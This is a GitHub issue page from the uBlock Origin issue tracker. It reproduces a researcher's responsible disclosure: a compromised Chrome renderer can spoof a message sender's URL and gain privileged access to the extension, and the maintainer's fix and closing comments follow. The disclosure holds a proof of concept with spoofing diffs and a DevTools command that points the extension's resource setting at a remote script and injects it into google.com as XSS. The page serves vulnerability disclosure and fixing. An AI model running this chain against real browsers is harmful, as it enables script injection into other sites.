=== Content from github.com_29bbb09d_20250114_212038.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FuBlockOrigin%2FuBlock-issues%2Fissues%2F1992)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FuBlockOrigin%2FuBlock-issues%2Fissues%2F1992)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=uBlockOrigin%2FuBlock-issues)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[uBlockOrigin](/uBlockOrigin)
/
**[uBlock-issues](/uBlockOrigin/uBlock-issues)**
Public

* [Notifications](/login?return_to=%2FuBlockOrigin%2FuBlock-issues) You must be signed in to change notification settings
* [Fork
  83](/login?return_to=%2FuBlockOrigin%2FuBlock-issues)
* [Star
   971](/login?return_to=%2FuBlockOrigin%2FuBlock-issues)

* [Code](/uBlockOrigin/uBlock-issues)
* [Issues
  105](/uBlockOrigin/uBlock-issues/issues)
* [Pull requests
  0](/uBlockOrigin/uBlock-issues/pulls)
* [Discussions](/uBlockOrigin/uBlock-issues/discussions)
* [Actions](/uBlockOrigin/uBlock-issues/actions)
* [Wiki](/uBlockOrigin/uBlock-issues/wiki)
* [Security](/uBlockOrigin/uBlock-issues/security)
* [Insights](/uBlockOrigin/uBlock-issues/pulse)

Additional navigation options

* [Code](/uBlockOrigin/uBlock-issues)
* [Issues](/uBlockOrigin/uBlock-issues/issues)
* [Pull requests](/uBlockOrigin/uBlock-issues/pulls)
* [Discussions](/uBlockOrigin/uBlock-issues/discussions)
* [Actions](/uBlockOrigin/uBlock-issues/actions)
* [Wiki](/uBlockOrigin/uBlock-issues/wiki)
* [Security](/uBlockOrigin/uBlock-issues/security)
* [Insights](/uBlockOrigin/uBlock-issues/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FuBlockOrigin%2FuBlock-issues%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FuBlockOrigin%2FuBlock-issues%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Use unspoofable Messenger.origin to determine privilege level of ports #1992

Closed

[gorhill](/gorhill) opened this issue
Feb 17, 2022
· 1 comment

Closed

# [Use unspoofable Messenger.origin to determine privilege level of ports](#top) #1992

[gorhill](/gorhill) opened this issue
Feb 17, 2022
· 1 comment

Labels
[fixed](/uBlockOrigin/uBlock-issues/labels/fixed)
issue has been addressed

## Comments

[![@gorhill](https://avatars.githubusercontent.com/u/585534?s=80&v=4)](/gorhill)

Copy link

Member

### **[gorhill](/gorhill)** commented [Feb 17, 2022](#issue-1142031666) • edited Loading

| Description Email received at `ubo-security at raymondhill.net` on 2022-02-17:  Hi,  I'd like to report a security vulnerability in the uBlock Origin extension.  A compromised renderer process of Chrome is able to spoof the URL of a messaging port and send privileged messages.  A compromised renderer process can spoof the 'MessageSender.url' in a chrome.runtime.onConnect listener[1][2]. 'vAPI.messaging.onPortConnect' uses 'sender.url' to determine whether the port is privileged (<https://github.com/gorhill/uBlock/blob/3154ed1bac227e4bc683c919d8d10bd01c9f8bb6/platform/common/vapi-background.js#L857-L861>). As a result, a compromised renderer can spoof the URL to an extension URL and perform sensitive actions.  For instance, it can set 'userResourcesLocation' and add a custom filter to perform XSS.  [1] [https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/compromised-renderers.md](https://chromium.googlesource.com/chromium/src/%2B/refs/heads/main/docs/security/compromised-renderers.md) [2] <https://developer.chrome.com/docs/extensions/mv3/security/#content_scripts>   * Affected browser versions   All Chrome including 98 (stable) to 101 * PoC  1. To simulate a compromised renderer, the following patch can be applied to Chromium:  ``` diff --git a/extensions/renderer/ipc_message_sender.cc b/extensions/renderer/ipc_message_sender.cc index 5e25676cbcb..5e7436c28d6 100644 --- a/extensions/renderer/ipc_message_sender.cc +++ b/extensions/renderer/ipc_message_sender.cc @@ -154,6 +154,9 @@ class MainThreadIPCMessageSender : public IPCMessageSender {          }          info.target_id = *target.extension_id;          info.source_url = script_context->url(); +        if (info.source_url.host() == "example.com") { +          info.source_url = GURL("chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/"); +        }            TRACE_RENDERER_EXTENSION_EVENT(              "MainThreadIPCMessageSender::SendOpenMessageChannel/extension", ```  or the following patch to the uBlock Origin extension:  ``` diff --git a/platform/common/vapi-background.js b/platform/common/vapi-background.js index 0d3cc584e..90e7c7089 100644 --- a/platform/common/vapi-background.js +++ b/platform/common/vapi-background.js @@ -855,7 +855,11 @@ vAPI.messaging = {          );          const portDetails = { port };          const sender = port.sender; -        const { tab, url } = sender; +        const { tab } = sender; +        let { url } = sender; +        if (url.indexOf("example.com") !== -1) { +            url = "chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/"; +        }          portDetails.frameId = sender.frameId;          portDetails.frameURL = url;          portDetails.privileged = url.startsWith(this.PRIVILEGED_URL); ```  2. Install uBlock Origin extension (<https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm>). 3. Visit `https://example.com` and open DevTools. 4. To simulate a compromised renderer, change the JavaScript context to uBlock Origin and run `'await vAPI.messaging.send("dashboard", {what: "writeHiddenSettings", content: "userResourcesLocation https://gist.githubusercontent.com/ylemkimon/c722fc2dc8510734a169d272aa116a6a/raw/1b04a075104aa27dbcaae13bd7e0ba0ef0f633ab/xss.js"}); await vAPI.messaging.send("dashboard", {what: "createUserFilter", filters: "google.com##+js(xss.js)"});'`. 5. Visit `https://google.com` and observe that an alert with the 'document.domain' is shown.  * Proposed fix   Use 'MessageSender.origin' (<https://developer.chrome.com/docs/extensions/reference/runtime/#property-MessageSender-origin>) if available (Chrome 80+), which is not spoofable[1].   Best regards, Young Min Kim  —— Young Min Kim CompSec Lab, Seoul National University uBlock Origin version 1.40.2 Browser name and version All Chrome including 98 (stable) to 101 Operating System and version Irrelevant |
| --- |
| The text was updated successfully, but these errors were encountered: |

 👍
2
 iam-py-test and Marek33 reacted with thumbs up emoji
 😕
1
 krystian3w reacted with confused emoji
 👀
1
 iam-py-test reacted with eyes emoji

All reactions

* 👍
  2 reactions
* 😕
  1 reaction
* 👀
  1 reaction

[gorhill](/gorhill)
added a commit
to gorhill/uBlock
that referenced
this issue
[Feb 17, 2022](#ref-commit-e1e2ba3)
[![@gorhill](https://avatars.githubusercontent.com/u/585534?s=40&v=4)](/gorhill)

`[Use unspoofable Messenger.origin to determine privilege level of ports](/gorhill/uBlock/commit/e1e2ba3d5d00112f74464ddcc9f561f065dd3623 "Use unspoofable Messenger.origin to determine privilege level of ports

Related issue:
- https://github.com/uBlockOrigin/uBlock-issues/issues/1992")`
…

`[e1e2ba3](/gorhill/uBlock/commit/e1e2ba3d5d00112f74464ddcc9f561f065dd3623)`

```
Related issue:
- [uBlockOrigin/uBlock-issues#1992](https://github.com/uBlockOrigin/uBlock-issues/issues/1992)
```

[gorhill](/gorhill)
added a commit
to gorhill/uBlock
that referenced
this issue
[Feb 18, 2022](#ref-commit-60072e7)
[![@gorhill](https://avatars.githubusercontent.com/u/585534?s=40&v=4)](/gorhill)

`[Minor code review](/gorhill/uBlock/commit/60072e7996e58cd7cca5186fde742d83cc6a612c "Minor code review

Related issue:
- https://github.com/uBlockOrigin/uBlock-issues/issues/1992")`
…

`[60072e7](/gorhill/uBlock/commit/60072e7996e58cd7cca5186fde742d83cc6a612c)`

```
Related issue:
- [uBlockOrigin/uBlock-issues#1992](https://github.com/uBlockOrigin/uBlock-issues/issues/1992)
```

[![@uBlock-user](https://avatars.githubusercontent.com/u/21290713?s=40&v=4)](/uBlock-user)
[uBlock-user](/uBlock-user)
added
the
[TODO](/uBlockOrigin/uBlock-issues/labels/TODO)
todo
label
[Feb 28, 2022](#event-6152342521)

[![@gorhill](https://avatars.githubusercontent.com/u/585534?s=40&v=4)](/gorhill)
[gorhill](/gorhill)
closed this as [completed](/uBlockOrigin/uBlock-issues/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Mar 3, 2022](#event-6178153111)

[![@gorhill](https://avatars.githubusercontent.com/u/585534?s=40&v=4)](/gorhill)
[gorhill](/gorhill)
added
[fixed](/uBlockOrigin/uBlock-issues/labels/fixed)
issue has been addressed
and removed
[TODO](/uBlockOrigin/uBlock-issues/labels/TODO)
todo
labels
[Mar 3, 2022](#event-6178154990)

[![@gorhill](https://avatars.githubusercontent.com/u/585534?s=40&v=4)](/gorhill)
[gorhill](/gorhill)
changed the title
~~Placeholder for issue to be filled later~~
Use unspoofable Messenger.origin to determine privilege level of ports
[Mar 3, 2022](#event-6178200637)

[![@gorhill](https://avatars.githubusercontent.com/u/585534?s=80&v=4)](/gorhill)

Copy link

Member

Author

### **[gorhill](/gorhill)** commented [Mar 3, 2022](#issuecomment-1058056302)

| Related to [#710](https://github.com/uBlockOrigin/uBlock-issues/issues/710), it turns out MessageSender.url can't be trusted as I had assumed, MessageSender.origin however can be trusted. |
| --- |

All reactions

Sorry, something went wrong.

[![@Imna1975](https://avatars.githubusercontent.com/u/45740014?s=40&v=4)](/Imna1975)
[Imna1975](/Imna1975)
mentioned this issue
[Sep 3, 2022](#ref-issue-1360825485)

[Fehler
#2243](/uBlockOrigin/uBlock-issues/issues/2243)

Closed

8 tasks

[mneunomne](/mneunomne)
pushed a commit
to mneunomne/AdNauseam
that referenced
this issue
[Sep 16, 2022](#ref-commit-f7d2d0e)
[![@gorhill](https://avatars.githubusercontent.com/u/585534?s=40&v=4)](/gorhill)

`[Use unspoofable Messenger.origin to determine privilege level of ports](/mneunomne/AdNauseam/commit/f7d2d0eab6ea716691706fb10978654fb00e554f "Use unspoofable Messenger.origin to determine privilege level of ports

Related issue:
- https://github.com/uBlockOrigin/uBlock-issues/issues/1992")`
…

`[f7d2d0e](/mneunomne/AdNauseam/commit/f7d2d0eab6ea716691706fb10978654fb00e554f)`

```
Related issue:
- [uBlockOrigin/uBlock-issues#1992](https://github.com/uBlockOrigin/uBlock-issues/issues/1992)
```

[mneunomne](/mneunomne)
pushed a commit
to mneunomne/AdNauseam
that referenced
this issue
[Sep 16, 2022](#ref-commit-ae28308)
[![@gorhill](https://avatars.githubusercontent.com/u/585534?s=40&v=4)](/gorhill)

`[Minor code review](/mneunomne/AdNauseam/commit/ae28308c7ad3d7c5200507e3128d30fc4514f5f6 "Minor code review

Related issue:
- https://github.com/uBlockOrigin/uBlock-issues/issues/1992")`
…

`[ae28308](/mneunomne/AdNauseam/commit/ae28308c7ad3d7c5200507e3128d30fc4514f5f6)`

```
Related issue:
- [uBlockOrigin/uBlock-issues#1992](https://github.com/uBlockOrigin/uBlock-issues/issues/1992)
```

[![@bumi](https://avatars.githubusercontent.com/u/318?s=40&v=4)](/bumi)
[bumi](/bumi)
mentioned this issue
[Jun 14, 2023](#ref-pullrequest-1756476886)

[fix: use host from sender not message
getAlby/lightning-browser-extension#2478](/getAlby/lightning-browser-extension/pull/2478)
 Merged

3 tasks

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FuBlockOrigin%2FuBlock-issues%2Fissues%2F1992)

Assignees

No one assigned

Labels

[fixed](/uBlockOrigin/uBlock-issues/labels/fixed)
issue has been addressed

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

2 participants

[![@gorhill](https://avatars.githubusercontent.com/u/585534?s=52&v=4)](/gorhill) [![@uBlock-user](https://avatars.githubusercontent.com/u/21290713?s=52&v=4)](/uBlock-user)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


